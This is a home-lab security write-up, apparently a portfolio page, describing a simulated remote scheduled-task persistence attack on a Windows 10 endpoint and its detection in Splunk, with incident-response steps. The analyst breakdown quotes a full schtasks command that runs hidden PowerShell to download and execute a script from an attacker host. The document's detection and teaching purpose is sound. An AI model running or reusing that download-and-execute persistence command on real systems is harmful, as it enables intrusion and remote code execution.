# Attack 2: Endpoint Persistence (Remote Scheduled Task)

## 📋 Incident Overview
*   **Tool:** Impacket (`psexec`), Nmap, `schtasks.exe`
*   **MITRE ATT&CK ID:** [T1053.005 - Scheduled Task/Job](https://attack.mitre.org/techniques/T1053/005/)
*   **Target:** Windows 10 Endpoint (`192.168.1.30`) via pfSense WAN (`192.168.80.133`)
*   **Severity:** Critical (Post-exploitation / Persistence)
*   **Attacker IP:** `192.168.80.1` (Kali Linux)

---

## 1. The Scenario & Reconnaissance
After compromising the `Administrator` credentials (via the RDP brute force), the attacker scanned the pfSense WAN IP to find a path for lateral movement. Nmap revealed that SMB (Port 445) was exposed.

<p align="center">
<img width="758" height="308" alt="nmap scan" src="https://github.com/user-attachments/assets/f257591c-ef45-48b8-bd27-d34b6535b792" />
  <br>
  <i>Figure 1: Nmap scan revealing exposed RDP (3389) and SMB (445) ports</i>
</p>

---

## 2. The Payload & C2 Infrastructure
Before executing the attack, the attacker hosted a malicious PowerShell script (`evil.ps1`) on the Kali Linux machine using a simple Python HTTP server (`python3 -m http.server 80`). The goal was to establish a Command & Control (C2) callback, forcing the Windows 10 endpoint to download and execute the payload from `http://192.168.80.128/evil.ps1`.

---

## 3. Attack Execution & Defense in Depth
The attacker used `impacket-psexec` to connect to the exposed SMB port and execute the payload as `NT AUTHORITY\SYSTEM`.

### 🛡️ Windows Defender Intervention
During the first attempt, **Windows Defender successfully detected and quarantined the psexec payload** (`VirTool:Win32/RemoteExec!pz`). This is a massive win for endpoint defense, proving that the AV is actively blocking lateral movement tools. 

<p align="center">
<img width="1116" height="656" alt="win security alert" src="https://github.com/user-attachments/assets/df3a1ad1-8009-468a-b0f2-0bd75ec9dadf" />
  <br>
  <i>Figure 2: Windows Defender successfully quarantining the Impacket psexec payload</i>
</p>

*(Note: To successfully generate the SIEM telemetry for this SOC investigation, Windows Defender was temporarily disabled to allow the remote execution to complete).*

<p align="center">
<img width="1114" height="352" alt="impacket command" src="https://github.com/user-attachments/assets/d4add7c9-2771-4a00-a7a6-9666fd7cda51" />
  <br>
  <i>Figure 3: Impacket psexec successfully creating the remote scheduled task</i>
</p>

---

## 4. Proof of Execution (Task Scheduler)
The attack succeeded. The attacker established persistence by creating a task named `WindowsUpdateService` that triggers at system startup.

<p align="center">
<img width="1116" height="656" alt="WindowsUpdateService task scheduler" src="https://github.com/user-attachments/assets/1cc5a494-332e-4c35-b5d7-6b27af4f936b" />
  <br>
  <i>Figure 4: Windows Task Scheduler showing the malicious task created by the attacker</i>
</p>

---

## 5. SIEM Detection & Threat Hunting
Because the Universal Forwarder is configured to ship raw XML (`renderXml = true`), the SOC Analyst must use SPL `rex` commands to parse the data and extract the Indicators of Compromise (IoCs). 

### The Detection Query
We hunted for `schtasks.exe` spawning a `powershell.exe` process, and extracted the exact command line to confirm the malicious payload.

```splunk
index=winlog_clients "*schtasks.exe*" "*powershell.exe*"
| rex field=_raw "<Data Name='CommandLine'>(?<CommandLine>[^<]+)"
| rex field=_raw "<Data Name='ParentImage'>(?<ParentImage>[^<]+)"
| table _time, host, ParentImage, CommandLine
```

<p align="center">
<img width="1327" height="418" alt="Splunk log 2" src="https://github.com/user-attachments/assets/52579a1d-cb43-437b-a91c-0de3846d786d" />
  <br>
  <i>Figure 5: Splunk extracting the malicious scheduled task creation from Sysmon XML telemetry</i>
</p>

### Analyst Breakdown of the Telemetry:
Looking at the extracted table, we can definitively prove the compromise:
*   **`ParentImage`**: `C:\Windows\XLoDyVd.exe` (The random name proves this is the temporary psexec service).
*   **`CommandLine`**: `schtasks /create /tn WindowsUpdateService /tr "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.80.128/evil.ps1')"` 

---

## 6. Post-Exploitation Potential
If this had been a real attack and not contained, the successful execution of the `evil.ps1` payload on system startup would grant the attacker a persistent reverse shell. From there, the attacker could:
*   Dump credentials (LSASS) to move laterally to the Domain Controller.
*   Deploy ransomware across the enterprise network.
*   Establish long-term espionage or data exfiltration channels.

---

## 7. Incident Response: Next Steps
Upon detecting this alert, the SOC Tier 1 Analyst would take the following IR actions:
1.  **Containment:** Immediately isolate the `Win10-SPLUNK-CLIENT` from the network via EDR or pfSense firewall rules.
2.  **Eradication:** Delete the `WindowsUpdateService` scheduled task and terminate any malicious PowerShell processes.
3.  **Recovery:** Reset the `Administrator` password (since it was compromised) and re-image the endpoint if necessary.
4.  **Lessons Learned:** Close port 445 on the WAN firewall and enforce the principle of least privilege for local admin accounts.

---

## 8. Mitigations / Recommendations
*   **Network Security:** SMB (Port 445) and RDP (Port 3389) should **never** be exposed directly to the internet. Require VPN access or a Zero Trust Network Access (ZTNA) solution.
*   **Endpoint Security:** Enable Windows Defender Attack Surface Reduction (ASR) rules to block Office macros and script-based execution.
*   **Logging & Monitoring:** Ensure Universal Forwarders are configured to capture Sysmon Event ID 1 (Process Creation) and Event ID 11 (File Creation) for critical directories (like `C:\Windows\System32\Tasks`).

---

## 9. What I Learned
*   **Defense in Depth Works:** Even though the attacker got past the firewall and compromised credentials, Windows Defender blocked the initial psexec payload. Layered defenses are crucial.
*   **SIEM Engineering Challenges:** I discovered that using `renderXml=true` in the Splunk Forwarder means you must use `rex` (Regular Expressions) to extract fields. In a production environment, I would deploy the **Splunk Add-on for Microsoft Windows** to handle this parsing natively.
*   **Psexec Artifacts:** I learned to identify the specific artifacts left by `psexec`, such as the random temporary service executable (`XLoDyVd.exe`) and the remote service creation logged in Event ID 7045.
